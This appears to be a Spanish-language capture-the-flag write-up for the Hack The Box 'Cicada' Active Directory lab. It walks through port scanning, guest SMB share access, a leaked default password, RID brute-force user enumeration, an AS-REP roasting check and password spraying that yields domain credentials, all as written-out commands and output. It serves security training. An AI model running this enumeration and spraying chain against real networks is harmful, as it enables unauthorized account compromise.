## Enumeración

`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.231.149 -oG allPorts`

```shell
[*] IP Address: 10.129.231.149
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,56018
```

`nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,56018 -sCV 10.129.231.149 -oN targeted`

### SMB (139, 445)
Enumeración por smb del dominio
`nxc smb 10.129.231.149`

Descubrimos que el dominio es `cicada.htb` lo añadimos al `/etc/hosts` como `10.129.231.149  cicada.htb dc01 dc01.cicada.htb`

Enumeramos si hay recursos compartidos
`nxc smb 10.129.231.149 --shares`

También podemos enumerar con una Null session
`smbclient -L 10.129.231.149 -N`

O usando netexec
`nxc smb 10.129.231.149 --shares -u 'guest' -p ''`

También podemos usar 


```shell
Disk           Permissions     Comment
----          -----------     -------
ADMIN$         NO ACCESS       Remote Admin
C$             NO ACCESS       Default share
DEV            NO ACCESS
HR             READ ONLY
IPC$           READ ONLY       Remote IPC
NETLOGON       NO ACCESS       Logon server share
SYSVOL         NO ACCESS       Logon server share
```

Vemos que tenemos un recurso compartido llamado HR al que podemos acceder a leer su contenido
`smbmap -H 10.129.231.149 -u 'guest' -p '' -r HR`

Vemos un archivo `.txt` asi que nos lo traemos a nuestra maquina
`smbclient //10.129.231.149/HR -N`

Nos lo traemos con
`get "Notice from HR.txt"`

EL archivo dice lo siguiente
```txt
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's e
ssential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned abov
e.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix o
f uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your passwo
rd with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to 
our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

Por lo que vemos nos dice que la contraseña es `Cicada$M6Corpb*@Lp#nZp!8`, pero no disponemos de un listado de usuarios


### RPC (135)
Nos intentamos conectar a la maquina sin credenciales
`rpcclient -U "" 10.129.231.149`

Nos deja acceder pero no podemos enumerar usuarios del dominio con `enumdomusers`, tampoco podemos enumerar grupos de dominio `enumdomgroups`



## Enumeración de usuarios validos
### KERBEROS (88)
Para enumerar los usuarios validos usaremos,
`kerbrute userenum  --dc 10.129.231.149 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`

Nos descubre los usuarios `guest` y `administrator`


### SMB (139, 445)
Este comando nos permite enumerar usuarios validos
`nxc smb 10.129.231.149 --shares -u 'guest' -p '' --rid-brute`

Para quedarnos solo con los usuarios que nos interesan usaremos la siguiente expresión regular
`nxc smb 10.129.231.149 --shares -u 'guest' -p '' --rid-brute | grep "SidTypeUser"`

Nos los copiamos, guardamos en un archivo y utilizamos la siguiente expresión regular para obtener solo los nombres
`cat users| awk '{print $2}' | tr '\\' ' ' | awk 'NF{print $NF}'

Hemos obtenido la siguiente lista de usuarios
```txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## Verificar usuarios validos
Para verificar si los usuarios son validos ejecutaremos
`kerbrute userenum  --dc 10.129.231.149 -d cicada.htb users`

Nos devuelve que los usuarios son validos

Probaremos con este listado potencial de usuarios ver si son susceptibles al ataque  [[#AS-REP Roasting Attack]]
## AS-REP Roasting Attack

Para ver si son susceptibles los usuarios a este ataque 
`impacket-GetNPUsers -no-pass -usersfile users.txt cicada.htb/`

Vemos que no son susceptibles

## Password spraying

Con la contraseña que hemos obtenido del `.txt` en [[#SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios validos]]
`nxc smb 10.129.231.149 -u users.txt -p passwords`

Optemos las siguientes credenciales
```ad-hint
michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
```

Verificamos que el usuario es valido
`nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`

Verificamos también si pertenece al grupo de remote users management
`nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`

En caso de que pertenezca a este aparecería el `pwned`

También podemos verificar si esa contraseña le pertenece a algún usuario mas
`nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success`

Y no hay ningún usuario mas

## Listar recursos compartidos con credenciales validas

Para listar estos recursos compartidos con un usuario valido usaremos
`nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares`

```txt
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DEV                             
HR              READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```



